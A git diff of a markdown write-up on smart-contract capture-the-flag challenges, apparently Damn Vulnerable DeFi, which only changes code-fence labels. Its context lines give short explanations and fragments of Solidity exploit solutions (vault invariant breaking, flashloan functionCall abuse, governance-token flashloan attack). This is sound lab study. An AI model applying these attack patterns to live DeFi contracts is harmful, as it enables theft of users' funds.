@@ -34,7 +34,7 @@ If `convertToShares(totalSupply) != totalAssets()` revert then the problem will 
 Simply, deposit some token directly, so the condition will be broken since supply only update while mint/burn.
 
 Solve:
-```solidity=
+```solidity
     function test_unstoppable() public checkSolvedByPlayer {
         token.transfer(address(vault), 10);
     }
@@ -46,7 +46,7 @@ Solve:
 Issue:
 
 The issue algin with the challenge is that, the share update in `transferFrom` function always using legacy share amount when `from` and `to` address are same.
-```solidity=
+```solidity
     function transferFrom(
         address from,
         address to,
@@ -70,7 +70,7 @@ The issue algin with the challenge is that, the share update in `transferFrom` f
 ```
 
 Solve:
-```solidity=
+```solidity
     function solve() external {
         // Claim 1000 GREY
         setup.claim();
@@ -106,7 +106,7 @@ Issue:
 The issue for this flashloan contract is the usage of `functionCall` which allows the attacker perform function call under flashloan contract's context.
 
 Solve:
-```solidity=
+```solidity
     function test_truster() public checkSolvedByPlayer {
         test t = new test();
 
@@ -130,7 +130,7 @@ The main idea for this program is utilize the the deposit function while flashlo
 
 Solve:
 
-```solidity=
+```solidity
 function test_sideEntrance() public checkSolvedByPlayer {
     Exploit exp = new Exploit(address(pool), recovery);
     exp.attack(address(pool).balance);
@@ -175,7 +175,7 @@ I feel the biggest issue is that the pool is providing the governance token via 
 ```
 
 Solve:
-```solidity=
+```solidity
     function test_selfie() public checkSolvedByPlayer {
         SelfiePoolExploit spe = new SelfiePoolExploit(
             pool,
@@ -193,7 +193,7 @@ Solve:
 
 ```
 
-```solidity=
+```solidity
 contract SelfiePoolExploit {
     SelfiePool pool;
     SimpleGovernance governance;
